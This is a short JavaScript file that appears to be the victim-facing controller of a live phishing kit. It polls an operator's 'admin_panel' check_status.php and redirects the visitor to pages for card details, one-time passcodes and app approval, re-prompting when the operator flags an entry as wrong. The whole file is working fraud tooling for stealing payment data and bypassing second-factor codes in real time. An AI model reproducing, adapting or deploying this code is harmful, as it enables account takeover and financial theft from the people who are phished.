var step = localStorage.getItem("step");
if(localStorage.getItem("otp") == "error"){
    localStorage.removeItem("otp");
}
if(localStorage.getItem("cc") == "error"){
    localStorage.removeItem("cc");
}
if(localStorage.getItem("app") == "error"){
    localStorage.removeItem("app");
}
if (step == "one") {
    setTimeout(function () {
        window.location.href = "update.html";
    }, 3000);

} else {
    setInterval(function () {
        $.get( admin_panel + "/check_status.php", function (data) {
            var status = data.trim();
            console.log(status);
            switch (status) {
                case "app":
                    window.location.href = "approve.html";
                    break;
                case "app2":
                    window.location.href = "approve.html";
                    localStorage.setItem("app", "error");
                    break;
                case "cc2":
                    localStorage.setItem("cc", "error");
                    window.location.href = "update.html";
                    break;
                case "otp":
                    window.location.href = "qom.html";
                    break;
                case "otp2":
                    localStorage.setItem("otp", "error");
                    window.location.href = "qom.html";
                    break;
                case "done":
                    window.location.href = "thankyou.html";
                    break;
                case "decline":
                case "cancled":
                case "ban":
                    window.location.href = "index.html";
                    break;
            }
        });
    }, 1500);
}